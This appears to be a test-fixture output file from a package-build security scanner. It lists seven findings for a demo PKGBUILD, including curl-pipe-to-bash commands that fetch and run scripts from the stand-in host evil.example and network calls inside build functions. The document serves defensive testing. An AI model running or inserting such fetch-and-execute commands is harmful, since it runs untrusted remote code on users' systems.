@@ -1,0 +1,59 @@
+
+Scan Results: demo-sinks
+============================================================
+
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/pipe-sinks/PKGBUILD:6
+    Code:   curl -fsSL https://evil.example/x |     bash
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/pipe-sinks/PKGBUILD:10
+    Code:   curl -fsSL https://evil.example/y | bash
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/x
+    This package downloads and executes code from https://evil.example/x at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/pipe-sinks/PKGBUILD:6
+    Code: curl -fsSL https://evil.example/x |     bash
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/y
+    This package downloads and executes code from https://evil.example/y at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/pipe-sinks/PKGBUILD:10
+    Code: curl -fsSL https://evil.example/y | bash
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[CRITICAL] EXEC-REMOTE Fetches and runs code from https://evil.example/z
+    This package downloads and executes code from https://evil.example/z at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.
+    Location: tests/fixtures/malicious/pipe-sinks/PKGBUILD:13
+    Code: bash < <(curl -fsSL https://evil.example/z)
+    Recommendation: Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.
+    Reference: CWE-494
+
+[HIGH] FUNC-001 Network access in build function
+    Function 'check' contains network access command 'curl'
+    Location: tests/fixtures/malicious/pipe-sinks/PKGBUILD:9
+    Recommendation: Network access should happen in source= array, not build functions
+
+[HIGH] FUNC-001 Network access in build function
+    Function 'pkgver' contains network access command 'curl'
+    Location: tests/fixtures/malicious/pipe-sinks/PKGBUILD:12
+    Recommendation: Network access should happen in source= array, not build functions
+
+
+
+============================================================
+Package: demo-sinks v1-1
+Scan duration: 17ms
+
+Found 7 issue(s):
+  5 CRITICAL
+  2 HIGH
+============================================================
